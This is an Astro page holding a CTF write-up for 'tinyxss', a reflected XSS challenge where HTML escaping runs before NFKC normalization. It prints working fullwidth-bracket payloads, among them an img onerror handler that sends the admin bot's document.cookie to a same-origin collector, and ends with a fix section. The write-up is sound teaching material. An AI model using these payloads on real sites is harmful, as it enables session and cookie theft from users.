---
import Layout from "@/layouts/Layout.astro";
import Nav from "@/components/nav.astro";
---

<Layout title="tinyxss — CATF Writeup">
  <Nav />
  <main class="max-w-3xl mx-auto pt-28 md:pt-32 pb-16 text-[var(--white)]">
    <a
      href="/writeups/"
      class="inline-flex items-center gap-2 text-sm text-[var(--white-icon)] hover:text-white transition-colors mb-8"
    >
      <svg
        xmlns="http://www.w3.org/2000/svg"
        viewBox="0 0 24 24"
        fill="currentColor"
        class="size-4"
      >
        <path d="M7.82843 10.9999H20V12.9999H7.82843L13.1924 18.3638L11.7782 19.778L4 11.9999L11.7782 4.22168L13.1924 5.63589L7.82843 10.9999Z"
        ></path>
      </svg>
      Back to writeups
    </a>

    <header class="mb-10">
      <div class="flex flex-wrap items-center gap-3 mb-3 text-sm">
        <span class="px-3 py-1 rounded-full border border-1 border-[var(--white-icon-tr)] bg-[#1414149c] text-[var(--sec)]">
          CATF CTF
        </span>
        <span class="px-3 py-1 rounded-full border border-1 border-[var(--white-icon-tr)] bg-[#1414149c] text-[var(--white-icon)]">
          Web
        </span>
        <span class="px-3 py-1 rounded-full border border-1 border-[var(--white-icon-tr)] bg-[#1414149c] text-[#A9FF5B]">
          Easy
        </span>
        <span class="text-[var(--white-icon)]">Nov 2026</span>
      </div>
      <h1 class="text-4xl md:text-5xl font-semibold mb-3">tinyxss</h1>
      <p class="text-[var(--white-icon)]">
        Fullwidth Unicode vs. HTML escaping — a tiny XSS with a huge confidence
        problem.
      </p>
    </header>

    <figure class="mb-10">
      <img
        src="/images/tinyxss/cover.png"
        alt="tinyxss challenge landing page"
        class="w-full rounded-2xl border border-1 border-[var(--white-icon-tr)]"
      />
    </figure>

    <article class="writeup space-y-5">
      <p>
        <strong>tinyxss</strong> is a small reflected-XSS challenge with an
        admin bot. The landing page confidently claims that it HTML-encodes
        input and is therefore “completely invincible”. Everything below was
        found from the outside: requests, responses and the rendered page — no
        source code.
      </p>

      <h2>TL;DR</h2>
      <p>
        ASCII <code>&lt;</code> and <code>&gt;</code> are encoded, but the
        fullwidth forms <code>＜</code> (U+FF1C) and <code>＞</code> (U+FF1E)
        are not. The server then normalizes the encoded string with NFKC,
        folding those fullwidth characters into ASCII angle brackets <em>after</em> the encoder has already run. The browser receives a real
        HTML tag.
      </p>
      <p>
        Quotes are encoded too, so the payload has to be quote-free. The
        final payload builds the collector path with
        <code>String.fromCharCode()</code> and appends the admin’s cookie:
      </p>
      <pre><code>＜img src=x onerror=location=String.fromCharCode(47,99,111,108,108,101,99,116,47,...)+encodeURIComponent(document.cookie)＞</code></pre>
      <p>The collector returned:</p>
      <pre><code>flag=CATF&#123;test_flag_do_not_submit&#125;</code></pre>
      <p class="text-sm text-[var(--white-icon)]">
        Note: the provided archive does not ship the deployment’s flag
        environment file, so this local reproduction shows the bot’s built-in
        test flag. The same chain reads the real flag on a live deployment.
      </p>

      <h2>First Contact</h2>
      <p>
        The landing page has a single <code>q</code> parameter and reflects it
        in two places: inside the search box and inside the result panel. A
        link to <code>/report</code> leads to an admin bot that accepts a URL
        on the challenge.
      </p>
      <p>
        The first test was the obvious one — send
        <code>&lt;h2&gt;BLACKBOX&lt;/h2&gt;</code> and look at the result. The
        panel shows the payload as text: the angle brackets were encoded.
        Quotes are encoded as well (the response uses entities such as
        <code>&amp;lt;</code>, <code>&amp;quot;</code> and
        <code>&amp;#39;</code>), so any payload that relies on quoted
        attribute values is a dead end.
      </p>
      <p>
        Then the same thing with fullwidth angle brackets:
        <code>＜h2＞BLACKBOX＜/h2＞</code>. This time the result panel renders
        a real heading:
      </p>
      <figure>
        <img
          src="/images/tinyxss/escape-bypass.png"
          alt="ASCII angle brackets are escaped while fullwidth angle brackets are rendered"
          class="w-full rounded-2xl border border-1 border-[var(--white-icon-tr)]"
        />
        <figcaption class="text-center text-sm text-[var(--white-icon)] mt-2">
          The same payload: ASCII brackets are shown as text, fullwidth
          brackets become a real heading.
        </figcaption>
      </figure>
      <p>
        Inspecting the page confirms that the result contains an actual
        <code>&lt;h2&gt;</code> element, not text. The browser only treats
        ASCII angle brackets as markup, so the fullwidth characters must have
        been converted to ASCII on the server <em>after</em> the encoder ran.
      </p>
      <p>
        That behaviour is the signature of an escape-then-normalize pipeline:
        HTML-escape the input first, then apply Unicode normalization. NFKC
        folds compatibility characters — including fullwidth forms — into
        their ASCII equivalents, recreating the metacharacters the encoder
        was supposed to neutralize.
      </p>

      <h2>From Markup to JavaScript</h2>
      <p>
        A heading proves HTML injection, but the admin bot needs JavaScript
        execution. The reliable choice is an image with a broken
        <code>src</code>, because <code>onerror</code> fires immediately
        without user interaction. Since quotes are encoded, the handler has to
        avoid them entirely.
      </p>
      <p>
        The following payload injects a heading, turns the page red and uses
        <code>String.fromCharCode()</code> to build the string
        <code>"red"</code> without quotes:
      </p>
      <pre><code>＜h2 style=color:red＞XSS confirmed＜/h2＞＜img src=x onerror=document.body.style.backgroundColor=String.fromCharCode(114,101,100)＞</code></pre>
      <p>
        <code>style=color:red</code> is a valid unquoted attribute value, and
        the handler contains no quotes at all:
      </p>
      <figure>
        <img
          src="/images/tinyxss/xss-proof.png"
          alt="Injected heading and red background proving XSS"
          class="w-full rounded-2xl border border-1 border-[var(--white-icon-tr)]"
        />
        <figcaption class="text-center text-sm text-[var(--white-icon)] mt-2">
          The heading and the red background both come from the injected
          payload.
        </figcaption>
      </figure>
      <p>
        The broken image icon is the injected <code>&lt;img&gt;</code> tag and
        the red background is <code>onerror</code> executing. Inline handlers
        run, so no CSP blocks them.
      </p>

      <h2>The Admin Bot and the Flag</h2>
      <p>
        The report form only accepts URLs on the challenge origin; external
        destinations are rejected. That rules out an external webhook and
        makes the built-in collector the obvious exfiltration channel. The
        report page conveniently creates an inbox and shows its collector URL.
      </p>
      <figure>
        <img
          src="/images/tinyxss/report-page.png"
          alt="Tiny Admin report page with a created inbox"
          class="w-full rounded-2xl border border-1 border-[var(--white-icon-tr)]"
        />
        <figcaption class="text-center text-sm text-[var(--white-icon)] mt-2">
          Creating an inbox gives us <code>/collect/&lt;id&gt;</code>.
        </figcaption>
      </figure>
      <p>
        A classic admin bot stores the secret in the browser, so the plan is
        simple: make the bot’s page read <code>document.cookie</code> and send
        it to the collector. The target path is
        <code>/collect/&lt;inbox_id&gt;?d=</code>.
      </p>
      <p>
        Quotes are unavailable, so the path is encoded as character codes and
        the cookie is URL-encoded:
      </p>
      <pre><code>location=String.fromCharCode(47,99,111,108,108,101,99,116,47,...)+encodeURIComponent(document.cookie)</code></pre>
      <p>The complete payload used in the screenshots is:</p>
      <pre><code>＜img src=x onerror=location=String.fromCharCode(47,99,111,108,108,101,99,116,47,87,79,72,84,97,117,106,45,110,77,111,63,100,61)+encodeURIComponent(document.cookie)＞</code></pre>
      <p>
        <code>String.fromCharCode()</code> avoids quotes, slashes and
        percent-signs inside the handler.
        <code>encodeURIComponent()</code> keeps the cookie safe if it contains
        characters such as <code>+</code>, <code>&amp;</code> or
        <code>#</code>.
      </p>
      <div class="rounded-xl border border-[var(--white-icon-tr)] bg-[#1414149c] p-4 text-sm">
        <strong>Gotcha:</strong> when the payload is placed in a query string,
        the <code>+</code> in <code>+encodeURIComponent(...)</code> must be
        percent-encoded as <code>%2B</code>. Otherwise the server decodes it
        to a space, the unquoted attribute ends early, and the handler breaks.
      </div>

      <h2>Reporting It</h2>
      <p>
        Paste the URL-encoded local URL into the report form and submit it. The
        bot resolves relative URLs against the challenge origin, opens the page
        in a fresh browser context and waits one second before closing it:
      </p>
      <pre><code>/?q=%EF%BC%9Cimg%20src%3Dx%20onerror%3Dlocation%3DString.fromCharCode(...)%2BencodeURIComponent(document.cookie)%EF%BC%9E</code></pre>
      <figure>
        <img
          src="/images/tinyxss/report-sent.png"
          alt="Report accepted by the admin bot"
          class="w-full rounded-2xl border border-1 border-[var(--white-icon-tr)]"
        />
        <figcaption class="text-center text-sm text-[var(--white-icon)] mt-2">
          Tiny Admin visited the reported URL.
        </figcaption>
      </figure>
      <p>
        The injected <code>&lt;img&gt;</code> fails to load immediately, so
        <code>onerror</code> runs well inside the one-second window. The
        handler sets <code>location</code> to the collector and appends the
        cookie:
      </p>
      <pre><code>GET /collect/&lt;inbox_id&gt;?d=flag%3DCATF%7B...%7D HTTP/1.1</code></pre>

      <h2>Reading the Flag</h2>
      <p>
        Open <code>/inbox/&lt;inbox_id&gt;</code>. The collector stored the
        query parameter and the inbox renders it:
      </p>
      <figure>
        <img
          src="/images/tinyxss/inbox-flag.png"
          alt="Inbox showing the stolen flag cookie"
          class="w-full rounded-2xl border border-1 border-[var(--white-icon-tr)]"
        />
        <figcaption class="text-center text-sm text-[var(--white-icon)] mt-2">
          The admin bot’s cookie arrived in the local inbox.
        </figcaption>
      </figure>
      <p>
        The value came straight from <code>document.cookie</code>, which also
        tells us the flag cookie is not <code>HttpOnly</code>. On the live
        deployment the value is the real <code>CATF&#123;...&#125;</code>
        flag; in this local reproduction the bot falls back to its built-in
        test value because no flag environment was supplied.
      </p>

      <h2>Why It Works</h2>
      <ul class="list-disc list-inside space-y-1">
        <li><strong>ASCII-only encoder:</strong> the escaping routine handles <code>&lt;</code>, <code>&gt;</code> and quotes, but not their fullwidth lookalikes.</li>
        <li><strong>Normalization after encoding:</strong> NFKC turns <code>＜</code>/<code>＞</code> into <code>&lt;</code>/<code>&gt;</code> after the encoder has finished.</li>
        <li><strong>Quote-free JavaScript:</strong> <code>String.fromCharCode()</code> builds paths and strings without quotes, which would be encoded.</li>
        <li><strong>Same-origin collector:</strong> only challenge URLs are accepted, and the built-in <code>/collect</code> endpoint is reachable from the bot’s browser.</li>
        <li><strong>Readable cookie:</strong> <code>document.cookie</code> returned the flag, so it was not <code>HttpOnly</code>.</li>
        <li><strong>Immediate trigger:</strong> a broken <code>&lt;img&gt;</code> fires <code>onerror</code> without user interaction, inside the bot’s one-second wait.</li>
      </ul>

      <h2>Fix</h2>
      <p>
        Normalize first, then escape. Escaping must be the last transformation
        before the value reaches HTML:
      </p>
      <pre><code>normalized = normalize("NFKC", input)
safe = html_escape(normalized)   # escaping is the final step</code></pre>
      <p>
        Even better, stop building HTML with string replacement. Use a
        context-aware template engine with autoescaping and pass the reflected
        value as data, so the escaping happens at render time in the correct
        context. Additional hardening for the bot:
      </p>
      <ul class="list-disc list-inside space-y-1">
        <li>Mark the flag cookie <code>HttpOnly</code> so JavaScript cannot read it.</li>
        <li>Add a restrictive Content Security Policy as defense in depth.</li>
        <li>Do not transform values after escaping — any post-escape transformation invalidates the escaping guarantee.</li>
      </ul>

      <h2>Final Thoughts</h2>
      <p>
        This is a great example of why “we HTML-escape everything” is not a
        complete answer. The encoder itself was correct; the pipeline around it
        was not. A single normalization step after escaping was enough to turn
        a harmless-looking fullwidth character into a working XSS.
      </p>
      <p>Thanks for the read! 🐛</p>
    </article>

    <div class="mt-12 pt-8 border-t border-[#ffffff10] flex justify-between items-center">
      <a
        href="/writeups/"
        class="inline-flex items-center gap-2 text-sm text-[var(--white-icon)] hover:text-white transition-colors"
      >
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="size-4">
          <path d="M7.82843 10.9999H20V12.9999H7.82843L13.1924 18.3638L11.7782 19.778L4 11.9999L11.7782 4.22168L13.1924 5.63589L7.82843 10.9999Z"></path>
        </svg>
        Back to writeups
      </a>
    </div>
  </main>
</Layout>

<style>
  .writeup {
    font-size: 1.05rem;
    line-height: 1.8;
    color: var(--white);
  }

  .writeup h2 {
    font-size: 1.75rem;
    font-weight: 600;
    color: var(--white);
    padding-top: 1.5rem;
  }

  .writeup strong {
    color: #fff;
  }

  .writeup code {
    background: #1414149c;
    border: 1px solid var(--white-icon-tr);
    border-radius: 0.4rem;
    padding: 0.1rem 0.4rem;
    font-size: 0.85em;
    color: var(--sec);
    font-family: ui-monospace, SFMono-Regular, Menlo, monospace;
    word-break: break-all;
  }

  .writeup pre {
    background: #1414149c;
    border: 1px solid var(--white-icon-tr);
    border-radius: 1rem;
    padding: 1rem 1.25rem;
    overflow-x: auto;
  }

  .writeup pre code {
    background: none;
    border: none;
    padding: 0;
    color: #dfdfdf;
    font-size: 0.9rem;
    line-height: 1.7;
    white-space: pre-wrap;
    overflow-wrap: anywhere;
  }

  .writeup figure img {
    display: block;
  }
</style>
